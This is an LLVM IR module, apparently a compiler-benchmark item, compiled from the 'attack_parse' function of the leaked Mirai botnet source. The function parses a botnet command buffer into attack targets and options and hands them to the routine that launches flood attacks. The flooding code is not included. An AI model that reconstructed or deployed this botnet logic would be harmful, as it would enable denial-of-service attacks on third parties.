; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack.c_attack_parse.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack.c_attack_parse.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_target = type { i32, i32, %struct.TYPE_4__ }
%struct.TYPE_4__ = type { %struct.TYPE_3__, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.attack_option = type { i32, i8* }

@AF_INET = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @attack_parse(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

16:                                               ; preds = %2
  br label %215

17:                                               ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20)
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %17
  br label %215

31:                                               ; preds = %17
  %32 = load i8*, i8** %3, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %3, align 8
  %34 = load i8, i8* %32, align 1
  %35 = sext i8 %34 to i64
  store i64 %35, i64* %7, align 8
  %36 = load i32, i32* %4, align 4
  %37 = sext i32 %36 to i64
  %38 = sub i64 %37, 4
  %39 = trunc i64 %38 to i32
  store i32 %39, i32* %4, align 4
  %40 = load i32, i32* %4, align 4
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %43

42:                                               ; preds = %31
  br label %215

43:                                               ; preds = %31
  %44 = load i8*, i8** %3, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** %3, align 8
  %46 = load i8, i8* %44, align 1
  %47 = sext i8 %46 to i32
  store i32 %47, i32* %8, align 4
  %48 = load i32, i32* %4, align 4
  %49 = sext i32 %48 to i64
  %50 = sub i64 %49, 4
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %4, align 4
  %52 = load i32, i32* %8, align 4
  %53 = icmp eq i32 %52, 0
  br i1 %53, label %54, label %55

54:                                               ; preds = %43
  br label %215

55:                                               ; preds = %43
  %56 = load i32, i32* %4, align 4
  %57 = sext i32 %56 to i64
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = mul i64 8, %59
  %61 = icmp ult i64 %57, %60
  br i1 %61, label %62, label %63

62:                                               ; preds = %55
  br label %215

63:                                               ; preds = %55
  %64 = load i32, i32* %8, align 4
  %65 = call i8* @calloc(i32 %64, i32 16)
  %66 = bitcast i8* %65 to %struct.attack_target*
  store %struct.attack_target* %66, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %67

67:                                               ; preds = %115, %63
  %68 = load i32, i32* %5, align 4
  %69 = load i32, i32* %8, align 4
  %70 = icmp slt i32 %68, %69
  br i1 %70, label %71, label %118

71:                                               ; preds = %67
  %72 = load i8*, i8** %3, align 8
  %73 = bitcast i8* %72 to i32*
  %74 = load i32, i32* %73, align 4
  %75 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %76 = load i32, i32* %5, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 1
  store i32 %74, i32* %79, align 4
  %80 = load i8*, i8** %3, align 8
  %81 = getelementptr inbounds i8, i8* %80, i64 4
  store i8* %81, i8** %3, align 8
  %82 = load i8*, i8** %3, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 1
  store i8* %83, i8** %3, align 8
  %84 = load i8, i8* %82, align 1
  %85 = sext i8 %84 to i32
  %86 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %87 = load i32, i32* %5, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i64 %88
  %90 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %89, i32 0, i32 0
  store i32 %85, i32* %90, align 4
  %91 = load i32, i32* %4, align 4
  %92 = sext i32 %91 to i64
  %93 = sub i64 %92, 8
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %4, align 4
  %95 = load i32, i32* @AF_INET, align 4
  %96 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %97 = load i32, i32* %5, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %96, i64 %98
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %99, i32 0, i32 2
  %101 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %100, i32 0, i32 1
  store i32 %95, i32* %101, align 4
  %102 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %103 = load i32, i32* %5, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %102, i64 %104
  %106 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %105, i32 0, i32 1
  %107 = load i32, i32* %106, align 4
  %108 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %109 = load i32, i32* %5, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %108, i64 %110
  %112 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %111, i32 0, i32 2
  %113 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %112, i32 0, i32 0
  %114 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %113, i32 0, i32 0
  store i32 %107, i32* %114, align 4
  br label %115

115:                                              ; preds = %71
  %116 = load i32, i32* %5, align 4
  %117 = add nsw i32 %116, 1
  store i32 %117, i32* %5, align 4
  br label %67

118:                                              ; preds = %67
  %119 = load i32, i32* %4, align 4
  %120 = sext i32 %119 to i64
  %121 = icmp ult i64 %120, 4
  br i1 %121, label %122, label %123

122:                                              ; preds = %118
  br label %215

123:                                              ; preds = %118
  %124 = load i8*, i8** %3, align 8
  %125 = getelementptr inbounds i8, i8* %124, i32 1
  store i8* %125, i8** %3, align 8
  %126 = load i8, i8* %124, align 1
  %127 = sext i8 %126 to i32
  store i32 %127, i32* %9, align 4
  %128 = load i32, i32* %4, align 4
  %129 = sext i32 %128 to i64
  %130 = sub i64 %129, 4
  %131 = trunc i64 %130 to i32
  store i32 %131, i32* %4, align 4
  %132 = load i32, i32* %9, align 4
  %133 = icmp sgt i32 %132, 0
  br i1 %133, label %134, label %207

134:                                              ; preds = %123
  %135 = load i32, i32* %9, align 4
  %136 = call i8* @calloc(i32 %135, i32 16)
  %137 = bitcast i8* %136 to %struct.attack_option*
  store %struct.attack_option* %137, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %138

138:                                              ; preds = %203, %134
  %139 = load i32, i32* %5, align 4
  %140 = load i32, i32* %9, align 4
  %141 = icmp slt i32 %139, %140
  br i1 %141, label %142, label %206

142:                                              ; preds = %138
  %143 = load i32, i32* %4, align 4
  %144 = sext i32 %143 to i64
  %145 = icmp ult i64 %144, 4
  br i1 %145, label %146, label %147

146:                                              ; preds = %142
  br label %215

147:                                              ; preds = %142
  %148 = load i8*, i8** %3, align 8
  %149 = getelementptr inbounds i8, i8* %148, i32 1
  store i8* %149, i8** %3, align 8
  %150 = load i8, i8* %148, align 1
  %151 = sext i8 %150 to i32
  %152 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %153 = load i32, i32* %5, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %155, i32 0, i32 0
  store i32 %151, i32* %156, align 8
  %157 = load i32, i32* %4, align 4
  %158 = sext i32 %157 to i64
  %159 = sub i64 %158, 4
  %160 = trunc i64 %159 to i32
  store i32 %160, i32* %4, align 4
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 4
  br i1 %163, label %164, label %165

164:                                              ; preds = %147
  br label %215

165:                                              ; preds = %147
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  %169 = sext i8 %168 to i32
  store i32 %169, i32* %12, align 4
  %170 = load i32, i32* %4, align 4
  %171 = sext i32 %170 to i64
  %172 = sub i64 %171, 4
  %173 = trunc i64 %172 to i32
  store i32 %173, i32* %4, align 4
  %174 = load i32, i32* %4, align 4
  %175 = load i32, i32* %12, align 4
  %176 = icmp slt i32 %174, %175
  br i1 %176, label %177, label %178

177:                                              ; preds = %165
  br label %215

178:                                              ; preds = %165
  %179 = load i32, i32* %12, align 4
  %180 = add nsw i32 %179, 1
  %181 = call i8* @calloc(i32 %180, i32 1)
  %182 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %183 = load i32, i32* %5, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %185, i32 0, i32 1
  store i8* %181, i8** %186, align 8
  %187 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %188 = load i32, i32* %5, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %187, i64 %189
  %191 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %190, i32 0, i32 1
  %192 = load i8*, i8** %191, align 8
  %193 = load i8*, i8** %3, align 8
  %194 = load i32, i32* %12, align 4
  %195 = call i32 @util_memcpy(i8* %192, i8* %193, i32 %194)
  %196 = load i32, i32* %12, align 4
  %197 = load i8*, i8** %3, align 8
  %198 = sext i32 %196 to i64
  %199 = getelementptr inbounds i8, i8* %197, i64 %198
  store i8* %199, i8** %3, align 8
  %200 = load i32, i32* %12, align 4
  %201 = load i32, i32* %4, align 4
  %202 = sub nsw i32 %201, %200
  store i32 %202, i32* %4, align 4
  br label %203

203:                                              ; preds = %178
  %204 = load i32, i32* %5, align 4
  %205 = add nsw i32 %204, 1
  store i32 %205, i32* %5, align 4
  br label %138

206:                                              ; preds = %138
  br label %207

207:                                              ; preds = %206, %123
  store i64 0, i64* @errno, align 8
  %208 = load i32, i32* %6, align 4
  %209 = load i64, i64* %7, align 8
  %210 = load i32, i32* %8, align 4
  %211 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %212 = load i32, i32* %9, align 4
  %213 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %214 = call i32 @attack_start(i32 %208, i64 %209, i32 %210, %struct.attack_target* %211, i32 %212, %struct.attack_option* %213)
  br label %215

215:                                              ; preds = %207, %177, %164, %146, %122, %62, %54, %42, %30, %16
  %216 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %217 = icmp ne %struct.attack_target* %216, null
  br i1 %217, label %218, label %221

218:                                              ; preds = %215
  %219 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %220 = call i32 @free(%struct.attack_target* %219)
  br label %221

221:                                              ; preds = %218, %215
  %222 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %223 = icmp ne %struct.attack_option* %222, null
  br i1 %223, label %224, label %228

224:                                              ; preds = %221
  %225 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %226 = load i32, i32* %9, align 4
  %227 = call i32 @free_opts(%struct.attack_option* %225, i32 %226)
  br label %228

228:                                              ; preds = %224, %221
  ret void
}

declare dso_local i32 @ntohl(i32) #1

declare dso_local i8* @calloc(i32, i32) #1

declare dso_local i32 @util_memcpy(i8*, i8*, i32) #1

declare dso_local i32 @attack_start(i32, i64, i32, %struct.attack_target*, i32, %struct.attack_option*) #1

declare dso_local i32 @free(%struct.attack_target*) #1

declare dso_local i32 @free_opts(%struct.attack_option*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
